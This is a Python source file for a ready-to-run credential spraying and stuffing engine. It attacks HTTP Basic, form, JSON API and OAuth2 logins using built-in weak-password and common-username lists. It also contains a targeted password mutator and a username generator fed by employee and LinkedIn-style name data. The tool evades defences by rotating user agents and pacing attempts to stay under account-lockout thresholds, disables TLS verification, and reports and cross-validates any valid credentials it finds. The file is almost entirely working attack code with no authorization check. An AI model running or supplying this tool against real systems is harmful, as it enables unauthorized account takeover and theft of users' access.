"""
Advanced Credential Spraying Engine
Password spraying, credential stuffing, and authentication testing
"""

import asyncio
import aiohttp
import json
import re
import ssl
import base64
import hashlib
import hmac
from typing import Dict, List, Optional, Any, Tuple, Callable
from dataclasses import dataclass, field
from datetime import datetime, timedelta
from enum import Enum
import random
import string


class AuthProtocol(Enum):
    """Supported authentication protocols"""
    HTTP_BASIC = "http_basic"
    HTTP_DIGEST = "http_digest"
    HTTP_NTLM = "http_ntlm"
    FORM_POST = "form_post"
    JSON_API = "json_api"
    OAUTH2 = "oauth2"
    JWT = "jwt"
    SSH = "ssh"
    FTP = "ftp"
    SMB = "smb"
    RDP = "rdp"
    LDAP = "ldap"
    KERBEROS = "kerberos"
    SMTP = "smtp"
    POP3 = "pop3"
    IMAP = "imap"
    MYSQL = "mysql"
    POSTGRES = "postgres"
    MSSQL = "mssql"
    MONGODB = "mongodb"
    REDIS = "redis"


@dataclass
class Credential:
    """Represents a username/password pair"""
    username: str
    password: str
    domain: str = ""
    source: str = "manual"
    created_at: str = field(default_factory=lambda: datetime.now().isoformat())


@dataclass
class SprayTarget:
    """Target for credential spraying"""
    url: str
    protocol: AuthProtocol
    port: int = 0
    ssl: bool = True
    domain: str = ""
    custom_headers: Dict[str, str] = field(default_factory=dict)
    form_data: Dict[str, str] = field(default_factory=dict)
    success_indicators: List[str] = field(default_factory=list)
    failure_indicators: List[str] = field(default_factory=list)


@dataclass
class SprayResult:
    """Result of a spray attempt"""
    target: str
    username: str
    password: str
    success: bool
    response_code: int = 0
    response_time: float = 0.0
    error: str = ""
    timestamp: str = field(default_factory=lambda: datetime.now().isoformat())
    additional_info: Dict[str, Any] = field(default_factory=dict)


class CredentialSprayEngine:
    """
    Advanced Credential Spraying Engine
    Supports multiple protocols and evasion techniques
    """
    
    # Common usernames to try
    COMMON_USERNAMES = [
        # Default/System accounts
        "admin", "administrator", "root", "user", "guest", "test",
        "operator", "service", "system", "support", "backup",
        
        # Common first names
        "john", "jane", "mike", "david", "sarah", "james", "mary",
        "robert", "jennifer", "michael", "linda", "william", "elizabeth",
        
        # IT/Admin accounts
        "sysadmin", "netadmin", "webadmin", "dbadmin", "helpdesk",
        "tech", "security", "developer", "devops", "deploy",
        
        # Service accounts
        "sql", "mysql", "oracle", "postgres", "mongodb", "redis",
        "ftp", "ssh", "www", "http", "nginx", "apache",
        "mail", "smtp", "imap", "pop3", "exchange",
        
        # Generic
        "demo", "temp", "training", "lab", "dev", "prod", "staging",
    ]
    
    # Common weak passwords
    COMMON_PASSWORDS = [
        # Default passwords
        "password", "Password", "Password1", "Password123",
        "admin", "Admin", "Admin123", "administrator",
        "root", "toor", "123456", "12345678", "123456789",
        
        # Keyboard patterns
        "qwerty", "qwerty123", "qwertyuiop", "asdfgh", "zxcvbn",
        "1qaz2wsx", "1q2w3e4r", "!@#$%^&*",
        
        # Common words
        "welcome", "Welcome1", "letmein", "changeme", "passw0rd",
        "P@ssw0rd", "P@ssword1", "Summer2024", "Winter2024",
        
        # Company/Organization patterns
        "Company123", "Corp2024", "Business1",
        
        # Empty/blank
        "", " ",
    ]
    
    def __init__(self, 
                 concurrency: int = 10,
                 delay_between_attempts: float = 0.5,
                 lockout_threshold: int = 5,
                 lockout_duration: int = 30):
        """
        Initialize the credential spray engine
        
        Args:
            concurrency: Maximum concurrent connections
            delay_between_attempts: Delay between attempts (seconds)
            lockout_threshold: Number of failures before pausing
            lockout_duration: Lockout pause duration (minutes)
        """
        self.concurrency = concurrency
        self.delay = delay_between_attempts
        self.lockout_threshold = lockout_threshold
        self.lockout_duration = lockout_duration
        
        self.session: Optional[aiohttp.ClientSession] = None
        self._semaphore: Optional[asyncio.Semaphore] = None
        self.results: List[SprayResult] = []
        self.successful_creds: List[Tuple[str, str]] = []
        
        # Tracking for lockout avoidance
        self._attempt_counts: Dict[str, int] = {}
        self._last_attempts: Dict[str, datetime] = {}
        self._locked_users: Dict[str, datetime] = {}
        
        # Statistics
        self.stats = {
            "total_attempts": 0,
            "successful": 0,
            "failed": 0,
            "errors": 0,
            "locked_out": 0,
            "start_time": None,
            "end_time": None,
        }
        
    async def __aenter__(self):
        await self.start()
        return self
        
    async def __aexit__(self, *args):
        await self.close()
        
    async def start(self):
        """Initialize the spray engine"""
        ssl_context = ssl.create_default_context()
        ssl_context.check_hostname = False
        ssl_context.verify_mode = ssl.CERT_NONE
        
        connector = aiohttp.TCPConnector(ssl=ssl_context, limit=self.concurrency)
        timeout = aiohttp.ClientTimeout(total=30)
        
        self.session = aiohttp.ClientSession(
            connector=connector,
            timeout=timeout,
        )
        self._semaphore = asyncio.Semaphore(self.concurrency)
        
    async def close(self):
        """Close the session"""
        if self.session:
            await self.session.close()
            
    async def spray(self, 
                    target: SprayTarget,
                    usernames: Optional[List[str]] = None,
                    passwords: Optional[List[str]] = None,
                    credentials: Optional[List[Credential]] = None,
                    mode: str = "spray") -> Dict[str, Any]:
        """
        Main spray function
        
        Args:
            target: Target configuration
            usernames: List of usernames to try
            passwords: List of passwords to try
            credentials: Pre-made credential pairs
            mode: 'spray' (one password per user) or 'stuff' (all combos)
        """
        self.stats["start_time"] = datetime.now().isoformat()
        
        # Build credential list
        if credentials:
            cred_pairs = [(c.username, c.password) for c in credentials]
        else:
            users = usernames or self.COMMON_USERNAMES
            pwds = passwords or self.COMMON_PASSWORDS
            
            if mode == "spray":
                # Spray mode: Try each password against all users before moving to next password
                cred_pairs = []
                for pwd in pwds:
                    for user in users:
                        cred_pairs.append((user, pwd))
            else:
                # Stuff mode: Try all passwords for each user
                cred_pairs = [(u, p) for u in users for p in pwds]
                
        print(f"[*] Starting credential spray against {target.url}")
        print(f"[*] Mode: {mode}, Attempts: {len(cred_pairs)}")
        
        # Execute based on protocol
        protocol_handlers = {
            AuthProtocol.HTTP_BASIC: self._spray_http_basic,
            AuthProtocol.FORM_POST: self._spray_form_post,
            AuthProtocol.JSON_API: self._spray_json_api,
            AuthProtocol.OAUTH2: self._spray_oauth2,
        }
        
        handler = protocol_handlers.get(target.protocol)
        if not handler:
            raise ValueError(f"Unsupported protocol: {target.protocol}")
            
        # Execute spray
        for i, (username, password) in enumerate(cred_pairs):
            # Check if user is locked out
            if self._is_locked_out(username):
                continue
                
            # Rate limiting
            await asyncio.sleep(self.delay)
            
            # Execute attempt
            result = await handler(target, username, password)
            self.results.append(result)
            
            # Update stats
            self.stats["total_attempts"] += 1
            if result.success:
                self.stats["successful"] += 1
                self.successful_creds.append((username, password))
                print(f"[+] SUCCESS: {username}:{password}")
            elif result.error:
                self.stats["errors"] += 1
            else:
                self.stats["failed"] += 1
                
            # Lockout tracking
            self._track_attempt(username, result.success)
            
            # Progress
            if (i + 1) % 50 == 0:
                print(f"[*] Progress: {i + 1}/{len(cred_pairs)} attempts")
                
        self.stats["end_time"] = datetime.now().isoformat()
        
        return {
            "target": target.url,
            "protocol": target.protocol.value,
            "stats": self.stats,
            "successful_credentials": self.successful_creds,
            "all_results": [r.__dict__ for r in self.results],
        }
        
    async def _spray_http_basic(self, target: SprayTarget, 
                                 username: str, password: str) -> SprayResult:
        """HTTP Basic authentication spray"""
        async with self._semaphore:
            try:
                auth_string = base64.b64encode(f"{username}:{password}".encode()).decode()
                headers = {
                    "Authorization": f"Basic {auth_string}",
                    "User-Agent": self._random_user_agent(),
                    **target.custom_headers,
                }
                
                start_time = datetime.now()
                async with self.session.get(target.url, headers=headers) as response:
                    elapsed = (datetime.now() - start_time).total_seconds()
                    
                    success = response.status in [200, 201, 204, 302]
                    
                    # Check for success/failure indicators in response
                    if target.success_indicators or target.failure_indicators:
                        content = await response.text()
                        
                        if any(ind in content for ind in target.failure_indicators):
                            success = False
                        elif any(ind in content for ind in target.success_indicators):
                            success = True
                            
                    return SprayResult(
                        target=target.url,
                        username=username,
                        password=password,
                        success=success,
                        response_code=response.status,
                        response_time=elapsed,
                    )
                    
            except Exception as e:
                return SprayResult(
                    target=target.url,
                    username=username,
                    password=password,
                    success=False,
                    error=str(e),
                )
                
    async def _spray_form_post(self, target: SprayTarget,
                                username: str, password: str) -> SprayResult:
        """Form-based POST authentication spray"""
        async with self._semaphore:
            try:
                # Build form data
                form_data = {**target.form_data}
                
                # Find and replace username/password fields
                username_fields = ["username", "user", "email", "login", "uid", "id"]
                password_fields = ["password", "pass", "pwd", "passwd", "secret"]
                
                for field in username_fields:
                    if field in form_data:
                        form_data[field] = username
                        break
                else:
                    form_data["username"] = username
                    
                for field in password_fields:
                    if field in form_data:
                        form_data[field] = password
                        break
                else:
                    form_data["password"] = password
                    
                headers = {
                    "Content-Type": "application/x-www-form-urlencoded",
                    "User-Agent": self._random_user_agent(),
                    **target.custom_headers,
                }
                
                start_time = datetime.now()
                async with self.session.post(
                    target.url,
                    data=form_data,
                    headers=headers,
                    allow_redirects=False
                ) as response:
                    elapsed = (datetime.now() - start_time).total_seconds()
                    content = await response.text()
                    
                    # Determine success
                    success = False
                    
                    # Check for redirect (often indicates success)
                    if response.status in [301, 302, 303, 307]:
                        location = response.headers.get("Location", "")
                        # Success if redirecting to dashboard/home, not back to login
                        if not any(x in location.lower() for x in ["login", "error", "fail"]):
                            success = True
                            
                    # Check for success cookies
                    cookies = response.cookies
                    if any(c for c in cookies if "session" in c.lower() or "token" in c.lower()):
                        success = True
                        
                    # Check indicators
                    if any(ind in content for ind in target.failure_indicators):
                        success = False
                    elif any(ind in content for ind in target.success_indicators):
                        success = True
                        
                    return SprayResult(
                        target=target.url,
                        username=username,
                        password=password,
                        success=success,
                        response_code=response.status,
                        response_time=elapsed,
                        additional_info={
                            "redirect_location": response.headers.get("Location"),
                            "cookies": [c for c in cookies.keys()],
                        }
                    )
                    
            except Exception as e:
                return SprayResult(
                    target=target.url,
                    username=username,
                    password=password,
                    success=False,
                    error=str(e),
                )
                
    async def _spray_json_api(self, target: SprayTarget,
                               username: str, password: str) -> SprayResult:
        """JSON API authentication spray"""
        async with self._semaphore:
            try:
                # Build JSON body
                json_data = {**target.form_data}
                
                # Find and replace username/password fields
                if "username" not in json_data and "email" not in json_data:
                    json_data["username"] = username
                else:
                    for field in ["username", "email", "user", "login"]:
                        if field in json_data:
                            json_data[field] = username
                            break
                            
                if "password" not in json_data:
                    json_data["password"] = password
                else:
                    for field in ["password", "pass", "secret"]:
                        if field in json_data:
                            json_data[field] = password
                            break
                            
                headers = {
                    "Content-Type": "application/json",
                    "Accept": "application/json",
                    "User-Agent": self._random_user_agent(),
                    **target.custom_headers,
                }
                
                start_time = datetime.now()
                async with self.session.post(
                    target.url,
                    json=json_data,
                    headers=headers
                ) as response:
                    elapsed = (datetime.now() - start_time).total_seconds()
                    
                    success = False
                    token = None
                    
                    try:
                        content = await response.json()
                        
                        # Check for token in response
                        token_fields = ["token", "access_token", "jwt", "session", "auth_token"]
                        for field in token_fields:
                            if field in content:
                                success = True
                                token = content[field]
                                break
                                
                        # Check for error indicators
                        error_fields = ["error", "message", "detail"]
                        if not success:
                            for field in error_fields:
                                if field in content:
                                    error_msg = str(content[field]).lower()
                                    if "invalid" in error_msg or "incorrect" in error_msg:
                                        success = False
                                        break
                                        
                    except Exception:
                        content = await response.text()
                        
                    # Status code check
                    if response.status in [200, 201] and not success:
                        success = True
                    elif response.status in [401, 403]:
                        success = False
                        
                    return SprayResult(
                        target=target.url,
                        username=username,
                        password=password,
                        success=success,
                        response_code=response.status,
                        response_time=elapsed,
                        additional_info={"token": token} if token else {},
                    )
                    
            except Exception as e:
                return SprayResult(
                    target=target.url,
                    username=username,
                    password=password,
                    success=False,
                    error=str(e),
                )
                
    async def _spray_oauth2(self, target: SprayTarget,
                             username: str, password: str) -> SprayResult:
        """OAuth2 Resource Owner Password Credentials spray"""
        async with self._semaphore:
            try:
                # OAuth2 ROPC flow
                form_data = {
                    "grant_type": "password",
                    "username": username,
                    "password": password,
                    **target.form_data,  # May include client_id, client_secret, scope
                }
                
                headers = {
                    "Content-Type": "application/x-www-form-urlencoded",
                    "Accept": "application/json",
                    **target.custom_headers,
                }
                
                start_time = datetime.now()
                async with self.session.post(
                    target.url,
                    data=form_data,
                    headers=headers
                ) as response:
                    elapsed = (datetime.now() - start_time).total_seconds()
                    
                    success = False
                    tokens = {}
                    
                    try:
                        content = await response.json()
                        
                        if "access_token" in content:
                            success = True
                            tokens = {
                                "access_token": content.get("access_token"),
                                "refresh_token": content.get("refresh_token"),
                                "token_type": content.get("token_type"),
                                "expires_in": content.get("expires_in"),
                            }
                            
                    except Exception:
                        pass
                        
                    return SprayResult(
                        target=target.url,
                        username=username,
                        password=password,
                        success=success,
                        response_code=response.status,
                        response_time=elapsed,
                        additional_info=tokens,
                    )
                    
            except Exception as e:
                return SprayResult(
                    target=target.url,
                    username=username,
                    password=password,
                    success=False,
                    error=str(e),
                )
                
    def _track_attempt(self, username: str, success: bool):
        """Track attempts for lockout avoidance"""
        if success:
            # Reset on success
            self._attempt_counts[username] = 0
            return
            
        self._attempt_counts[username] = self._attempt_counts.get(username, 0) + 1
        self._last_attempts[username] = datetime.now()
        
        # Check if we should pause this user
        if self._attempt_counts[username] >= self.lockout_threshold:
            self._locked_users[username] = datetime.now()
            self.stats["locked_out"] += 1
            print(f"[!] Pausing attempts for {username} to avoid lockout")
            
    def _is_locked_out(self, username: str) -> bool:
        """Check if a user is currently in lockout pause"""
        if username not in self._locked_users:
            return False
            
        lockout_time = self._locked_users[username]
        unlock_time = lockout_time + timedelta(minutes=self.lockout_duration)
        
        if datetime.now() >= unlock_time:
            # Lockout expired, reset
            del self._locked_users[username]
            self._attempt_counts[username] = 0
            return False
            
        return True
        
    def _random_user_agent(self) -> str:
        """Generate random user agent for evasion"""
        user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        ]
        return random.choice(user_agents)


class PasswordGenerator:
    """
    Smart Password Generator
    Generates targeted password lists based on target intelligence
    """
    
    def __init__(self):
        self.generated: List[str] = []
        
    def generate(self, 
                 base_words: Optional[List[str]] = None,
                 organization: str = "",
                 year_range: Tuple[int, int] = (2020, 2025),
                 include_common: bool = True,
                 include_keyboard: bool = True,
                 include_seasons: bool = True,
                 min_length: int = 8,
                 max_length: int = 20) -> List[str]:
        """
        Generate targeted password list
        """
        passwords = set()
        
        # Base words from organization
        if organization:
            base_words = base_words or []
            # Add organization name variations
            org_clean = re.sub(r'[^a-zA-Z0-9]', '', organization)
            base_words.extend([
                organization,
                org_clean,
                org_clean.lower(),
                org_clean.upper(),
                org_clean.capitalize(),
            ])
            
        # Process base words
        if base_words:
            for word in base_words:
                passwords.update(self._mutate_word(word, year_range))
                
        # Add common passwords
        if include_common:
            passwords.update([
                "password", "Password", "Password1", "Password123",
                "P@ssw0rd", "P@ssword1", "Passw0rd!",
                "admin", "Admin123", "administrator",
                "welcome", "Welcome1", "Welcome123",
                "letmein", "changeme", "guest",
            ])
            
        # Add keyboard patterns
        if include_keyboard:
            passwords.update([
                "qwerty", "qwerty123", "Qwerty123",
                "asdfgh", "zxcvbn", "1qaz2wsx",
                "qwertyuiop", "asdfghjkl",
            ])
            
        # Add seasonal passwords
        if include_seasons:
            seasons = ["Spring", "Summer", "Fall", "Autumn", "Winter"]
            for season in seasons:
                for year in range(year_range[0], year_range[1] + 1):
                    passwords.add(f"{season}{year}")
                    passwords.add(f"{season}{year}!")
                    passwords.add(f"{season}{str(year)[-2:]}")
                    
        # Filter by length
        passwords = {p for p in passwords if min_length <= len(p) <= max_length}
        
        self.generated = list(passwords)
        return self.generated
        
    def _mutate_word(self, word: str, year_range: Tuple[int, int]) -> List[str]:
        """Generate mutations of a word"""
        mutations = []
        
        # Case variations
        mutations.extend([
            word,
            word.lower(),
            word.upper(),
            word.capitalize(),
            word.swapcase(),
        ])
        
        # Leetspeak
        leet_map = {'a': '@', 'e': '3', 'i': '1', 'o': '0', 's': '$', 't': '7'}
        leet_word = word.lower()
        for char, replacement in leet_map.items():
            leet_word = leet_word.replace(char, replacement)
        mutations.append(leet_word)
        mutations.append(leet_word.capitalize())
        
        # Add numbers
        for suffix in ["1", "12", "123", "1234", "!", "!!", "@", "#"]:
            for m in [word, word.capitalize()]:
                mutations.append(f"{m}{suffix}")
                
        # Add years
        for year in range(year_range[0], year_range[1] + 1):
            mutations.append(f"{word.capitalize()}{year}")
            mutations.append(f"{word.capitalize()}{year}!")
            
        # Common patterns
        mutations.extend([
            f"{word}@123",
            f"{word}#1",
            f"{word}!@#",
            f"@{word}123",
        ])
        
        return mutations


class UsernameGenerator:
    """
    Username Generator
    Generates username lists from employee data
    """
    
    def __init__(self):
        self.generated: List[str] = []
        
    def from_names(self, 
                   names: List[Tuple[str, str]],
                   domain: str = "",
                   formats: Optional[List[str]] = None) -> List[str]:
        """
        Generate usernames from first/last name pairs
        
        Args:
            names: List of (first_name, last_name) tuples
            domain: Email domain to append
            formats: Username format patterns
        """
        if formats is None:
            formats = [
                "{first}",
                "{last}",
                "{first}.{last}",
                "{first}_{last}",
                "{f}{last}",
                "{first}{l}",
                "{first}{last}",
                "{last}{first}",
                "{f}.{last}",
                "{first}.{l}",
            ]
            
        usernames = set()
        
        for first, last in names:
            first = first.lower().strip()
            last = last.lower().strip()
            
            if not first or not last:
                continue
                
            for fmt in formats:
                try:
                    username = fmt.format(
                        first=first,
                        last=last,
                        f=first[0],
                        l=last[0],
                    )
                    usernames.add(username)
                    
                    if domain:
                        usernames.add(f"{username}@{domain}")
                        
                except Exception:
                    pass
                    
        self.generated = list(usernames)
        return self.generated
        
    def from_linkedin(self, profiles: List[Dict[str, str]], 
                      domain: str = "") -> List[str]:
        """Generate usernames from LinkedIn-style profile data"""
        names = []
        for profile in profiles:
            first = profile.get("first_name", profile.get("firstName", ""))
            last = profile.get("last_name", profile.get("lastName", ""))
            if first and last:
                names.append((first, last))
                
        return self.from_names(names, domain)


class CredentialValidator:
    """
    Credential Validation Engine
    Validates discovered credentials across multiple services
    """
    
    def __init__(self, spray_engine: CredentialSprayEngine):
        self.engine = spray_engine
        
    async def validate_credential(self, 
                                   username: str, 
                                   password: str,
                                   targets: List[SprayTarget]) -> Dict[str, Any]:
        """Validate a credential pair across multiple targets"""
        results = {
            "username": username,
            "password": password,
            "valid_on": [],
            "invalid_on": [],
            "errors": [],
        }
        
        for target in targets:
            result = await self._test_single(target, username, password)
            
            if result.success:
                results["valid_on"].append({
                    "target": target.url,
                    "protocol": target.protocol.value,
                })
            elif result.error:
                results["errors"].append({
                    "target": target.url,
                    "error": result.error,
                })
            else:
                results["invalid_on"].append(target.url)
                
        return results
        
    async def _test_single(self, target: SprayTarget,
                           username: str, password: str) -> SprayResult:
        """Test a single credential on a target"""
        protocol_map = {
            AuthProtocol.HTTP_BASIC: self.engine._spray_http_basic,
            AuthProtocol.FORM_POST: self.engine._spray_form_post,
            AuthProtocol.JSON_API: self.engine._spray_json_api,
            AuthProtocol.OAUTH2: self.engine._spray_oauth2,
        }
        
        handler = protocol_map.get(target.protocol)
        if handler:
            return await handler(target, username, password)
            
        return SprayResult(
            target=target.url,
            username=username,
            password=password,
            success=False,
            error="Unsupported protocol",
        )


# Async helper functions
async def spray_target(target_url: str,
                       protocol: AuthProtocol = AuthProtocol.HTTP_BASIC,
                       usernames: Optional[List[str]] = None,
                       passwords: Optional[List[str]] = None,
                       **kwargs) -> Dict[str, Any]:
    """Convenience function for credential spraying"""
    
    target = SprayTarget(
        url=target_url,
        protocol=protocol,
        **kwargs
    )
    
    async with CredentialSprayEngine() as engine:
        return await engine.spray(target, usernames, passwords)


if __name__ == "__main__":
    import sys
    
    async def main():
        if len(sys.argv) < 2:
            print("Usage: python credential_spray.py <target_url>")
            sys.exit(1)
            
        target_url = sys.argv[1]
        
        print(f"\n{'='*60}")
        print(f"Credential Spray Engine - Target: {target_url}")
        print(f"{'='*60}\n")
        
        # Generate passwords based on target
        gen = PasswordGenerator()
        passwords = gen.generate(
            organization="Example Corp",
            include_common=True,
            include_seasons=True,
        )
        
        print(f"[*] Generated {len(passwords)} passwords")
        
        # Run spray
        results = await spray_target(
            target_url,
            protocol=AuthProtocol.HTTP_BASIC,
            usernames=CredentialSprayEngine.COMMON_USERNAMES[:20],
            passwords=passwords[:50],
        )
        
        print(f"\n[+] Results:")
        print(f"    Total attempts: {results['stats']['total_attempts']}")
        print(f"    Successful: {results['stats']['successful']}")
        print(f"    Failed: {results['stats']['failed']}")
        
        if results['successful_credentials']:
            print(f"\n[!] Valid credentials found:")
            for user, pwd in results['successful_credentials']:
                print(f"    {user}:{pwd}")
                
    asyncio.run(main())
